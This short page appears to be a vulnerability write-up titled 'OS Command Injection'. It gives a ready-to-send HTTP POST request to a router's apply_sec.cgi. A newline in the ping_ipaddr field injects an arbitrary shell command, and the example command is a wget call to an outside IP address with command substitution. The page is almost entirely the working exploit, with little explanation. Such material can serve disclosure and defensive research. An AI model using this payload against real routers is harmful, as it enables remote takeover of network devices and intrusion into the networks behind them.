+++
title = "OS Command Injection"
date = 2021-10-18T20:39:54-06:00
weight = 5
+++


## OS Command Injection

Make an HTTP POST request to the router, replacing "{URL_ENCODED_CMD}" with the desired command to run on the router like `wget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)`
```sh
POST /apply_sec.cgi HTTP/1.1
Host: 192.168.232.128
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 131
Connection: close
Referer: http://192.168.232.128/login_pic.asp
Cookie: uid=1234123
Upgrade-Insecure-Requests: 1
html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0a{URL_ENCODED_CMD}

```
